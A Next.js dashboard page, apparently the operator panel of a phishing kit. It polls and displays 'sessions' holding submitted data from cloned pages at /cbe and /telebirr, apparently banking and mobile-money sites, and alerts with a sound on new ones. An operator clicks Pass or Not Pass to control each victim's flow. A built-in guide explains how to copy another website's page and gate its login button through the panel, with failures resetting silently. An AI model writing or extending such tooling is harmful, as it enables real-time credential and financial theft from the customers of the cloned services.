'use client';

import { useCallback, useEffect, useRef, useState } from 'react';

interface Session {
  id: string;
  siteId: string;
  siteName: string;
  page: string;
  meta: Record<string, unknown>;
  redirectUrl: string;
  status: 'pending' | 'pass' | 'notpass';
  createdAt: number;
  decidedAt: number | null;
}

export default function DashPage() {
  const [sessions, setSessions] = useState<Session[]>([]);
  const [filter, setFilter] = useState('');
  const [state, setState] = useState('');
  const [soundOn, setSoundOn] = useState(true);
  const seen = useRef<Set<string>>(new Set());
  const audio = useRef<AudioContext | null>(null);

  const ping = useCallback(() => {
    if (!soundOn) return;
    try {
      const AC = window.AudioContext || (window as unknown as { webkitAudioContext: typeof AudioContext }).webkitAudioContext;
      audio.current = audio.current || new AC();
      const o = audio.current.createOscillator();
      const g = audio.current.createGain();
      o.connect(g);
      g.connect(audio.current.destination);
      o.frequency.value = 880;
      g.gain.value = 0.08;
      o.start();
      o.stop(audio.current.currentTime + 0.15);
    } catch {}
  }, [soundOn]);

  const load = useCallback(async () => {
    const r = await fetch('/api/list-sessions');
    const j = await r.json();
    const list: Session[] = j.sessions || [];
    setSessions(list);
    let fresh = false;
    list.forEach((s) => {
      if (s.status === 'pending' && !seen.current.has(s.id)) {
        seen.current.add(s.id);
        fresh = true;
      }
    });
    if (fresh) ping();
  }, [ping]);

  useEffect(() => {
    load();
    const t = setInterval(load, 2000);
    return () => clearInterval(t);
  }, [load]);

  async function decide(id: string, decision: 'pass' | 'notpass') {
    await fetch('/api/decide-session', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id, decision })
    });
    load();
  }

  const siteIds = [...new Set(sessions.map((s) => s.siteId))];
  const list = sessions.filter(
    (s) => (!filter || s.siteId === filter) && (!state || s.status === state)
  );

  return (
    <div style={{ background: '#0b0f14', color: '#e8eef5', minHeight: '100vh', font: '14px/1.5 system-ui,sans-serif' }}>
      <header style={{ display: 'flex', alignItems: 'center', gap: 12, padding: '16px 20px', borderBottom: '1px solid #223041', position: 'sticky', top: 0, background: '#0b0f14', zIndex: 5 }}>
        <div style={{ width: 34, height: 34, borderRadius: 10, background: 'linear-gradient(135deg,#38bdf8,#6366f1)', display: 'grid', placeItems: 'center', fontWeight: 800, color: '#fff' }}>D</div>
        <h1 style={{ fontSize: 18, margin: 0 }}>Dash <small style={{ color: '#8fa1b5', fontWeight: 400 }}>manual session gate · Pass / Not Pass</small></h1>
        <div style={{ marginLeft: 'auto', color: '#8fa1b5', fontSize: 12 }}>{sessions.length}/20 sessions · auto-refresh 2s</div>
      </header>
      <div style={{ maxWidth: 1100, margin: '0 auto', padding: 20 }}>
        <div style={{ display: 'flex', gap: 10, flexWrap: 'wrap', marginBottom: 16 }}>
          <select value={filter} onChange={(e) => setFilter(e.target.value)} style={sel}>
            <option value="">All sites</option>
            {siteIds.map((s) => (
              <option key={s} value={s}>{s}</option>
            ))}
          </select>
          <select value={state} onChange={(e) => setState(e.target.value)} style={sel}>
            <option value="">All states</option>
            <option value="pending">Pending only</option>
            <option value="pass">Passed</option>
            <option value="notpass">Not passed</option>
          </select>
          <button onClick={load} style={btn}>Refresh</button>
          <button onClick={() => setSoundOn(!soundOn)} style={btn}>🔔 sound: {soundOn ? 'on' : 'off'}</button>
          <a href="/cbe" style={{ ...btn, textDecoration: 'none', lineHeight: '32px' }}>/cbe</a>
          <a href="/telebirr" style={{ ...btn, textDecoration: 'none', lineHeight: '32px' }}>/telebirr</a>
        </div>
        {list.length === 0 && (
          <div style={{ color: '#8fa1b5', textAlign: 'center', padding: '40px 0' }}>
            Waiting for sessions… trigger a gated button on <a style={{ color: '#38bdf8' }} href="/cbe">/cbe</a> or <a style={{ color: '#38bdf8' }} href="/telebirr">/telebirr</a>.
          </div>
        )}
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill,minmax(320px,1fr))', gap: 14 }}>
          {list.map((s) => (
            <div key={s.id} style={{ ...card, borderColor: s.status === 'pending' ? '#f59e0b' : s.status === 'pass' ? '#22c55e' : '#223041', opacity: s.status === 'notpass' ? 0.65 : 1 }}>
              <div>
                <span style={{ ...badge, ...(s.status === 'pending' ? bPend : s.status === 'pass' ? bPass : bNot) }}>{s.status}</span>{' '}
                <b>{s.siteName || s.siteId}</b> <span style={{ color: '#8fa1b5', fontSize: 12 }}>· {s.siteId}</span>
              </div>
              <div style={{ color: '#8fa1b5', fontSize: 12 }}>
                {new Date(s.createdAt).toLocaleString()} · {s.page} · <code>{s.id.slice(-6)}</code>
              </div>
              <pre style={pre}>{JSON.stringify(s.meta || {}, null, 2).slice(0, 800)}</pre>
              {s.status === 'pending' ? (
                <div style={{ display: 'flex', gap: 8, marginTop: 12 }}>
                  <button onClick={() => decide(s.id, 'pass')} style={btnPass}>Pass</button>
                  <button onClick={() => decide(s.id, 'notpass')} style={btnNot}>Not Pass</button>
                </div>
              ) : (
                <div style={{ color: '#8fa1b5', fontSize: 12 }}>
                  decided: {s.decidedAt ? new Date(s.decidedAt).toLocaleString() : ''} → {s.status}
                </div>
              )}
            </div>
          ))}
        </div>
        <details style={details}>
          <summary><b>Add a new website (same domain, new path)</b></summary>
          <ol>
            <li>Copy its page into <code>app/&lt;name&gt;/page.tsx</code> and components into <code>components/&lt;name&gt;/</code>.</li>
            <li>Gate its submit button with <code>await requestDashApproval({'{'}siteId:'&lt;name&gt;', page:'login', meta:{'{'}...{'}'}{'}'})</code> from <code>@/lib/dash-gate</code> — Pass advances, anything else resets silently.</li>
            <li>Add <code>{'{'}&quot;id&quot;:&quot;&lt;name&gt;&quot;{'}'}</code> to <code>sites.config.json</code>. Deploy — it appears at <code>/&lt;name&gt;</code> automatically.</li>
          </ol>
        </details>
      </div>
    </div>
  );
}

const sel: React.CSSProperties = { background: '#131a23', color: '#e8eef5', border: '1px solid #223041', borderRadius: 8, padding: '8px 10px' };
const btn: React.CSSProperties = { background: '#243040', color: '#fff', border: 0, borderRadius: 8, padding: '10px 14px', fontWeight: 700, cursor: 'pointer' };
const btnPass: React.CSSProperties = { background: '#22c55e', color: '#04120a', flex: 1, border: 0, borderRadius: 8, padding: '10px 14px', fontWeight: 700, cursor: 'pointer' };
const btnNot: React.CSSProperties = { background: '#243040', color: '#e8eef5', flex: 1, border: 0, borderRadius: 8, padding: '10px 14px', fontWeight: 700, cursor: 'pointer' };
const card: React.CSSProperties = { background: '#131a23', border: '1px solid #223041', borderRadius: 12, padding: 14 };
const badge: React.CSSProperties = { display: 'inline-block', padding: '2px 8px', borderRadius: 99, fontSize: 11, fontWeight: 700, textTransform: 'uppercase' };
const bPend: React.CSSProperties = { background: '#3a2b08', color: '#fbbf24' };
const bPass: React.CSSProperties = { background: '#052e16', color: '#4ade80' };
const bNot: React.CSSProperties = { background: '#3f1d1d', color: '#f87171' };
const pre: React.CSSProperties = { background: '#0a0e13', border: '1px solid #223041', borderRadius: 8, padding: 10, overflow: 'auto', fontSize: 12, maxHeight: 140 };
const details: React.CSSProperties = { marginTop: 18, background: '#131a23', border: '1px solid #223041', borderRadius: 12, padding: 14 };
